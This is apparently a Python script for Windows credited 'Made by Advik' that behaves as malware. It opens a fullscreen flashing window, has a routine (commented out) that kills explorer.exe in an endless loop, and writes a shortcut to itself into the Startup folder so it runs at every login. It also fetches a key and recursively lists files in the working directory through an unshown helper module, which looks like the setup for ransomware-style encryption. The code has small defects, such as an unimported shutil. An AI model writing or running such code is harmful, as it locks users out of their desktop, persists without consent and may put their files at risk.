from functions import *
from threading import Thread
from tkinter import Tk
from itertools import cycle
from subprocess import run
from win32com.client import Dispatch

import os, sys

class Main(Tk):
    def init(self):
        self.title('Made by Advik')
        self.screen_width = self.winfo_screenwidth()
        self.screen_height = self.winfo_screenheight()
        self.geometry(f'{self.screen_width}x{self.screen_height}+0+0')
        self.var = True
        self.colours = cycle(

            [
                'red',
                'green',
                'blue',
                'yellow',
                'orange',
                'purple',
                'pink',
                'cyan',
                'white',
                'black',
                
            ]
                        )
        self.startup = os.path.join(os.path.expanduser('~'), 'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')
        print(self.startup)
    
    def _change_screen(self):
        while True:
            if self.var:
                self.var = False
                self.overrideredirect(True)

            elif self.var is False:
                self.var = True
                self.overrideredirect(False)

            self.configure(bg=next(self.colours))
            run('taskkill /f /im explorer.exe', shell=True)
    
    def change_screen(self):
        t = Thread(target=self._change_screen)
        t.start()
    
    def create_shortcut(self):
        abc = 1
        pth = os.path.join(self.startup, '%s.lnk')
        while True:
            if os.path.isfile(pth % abc):
                abc += 1
                continue
            elif os.path.isdir(pth):
                shutil.rmtree(pth)
            else:
                break
        
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(pth % abc)
        shortcut.Targetpath = sys.argv[0]
        shortcut.WorkingDirectory = os.getcwd()
        shortcut.save()

    def start(self):
        self.init()
        # self.change_screen()
        self.create_shortcut()
        self.mainloop()

cwd = os.getcwd()

key = get_key()

files = list_files(cwd, '*.*', True)

if __name__ == '__main__':
    main = Main()
    main.start()
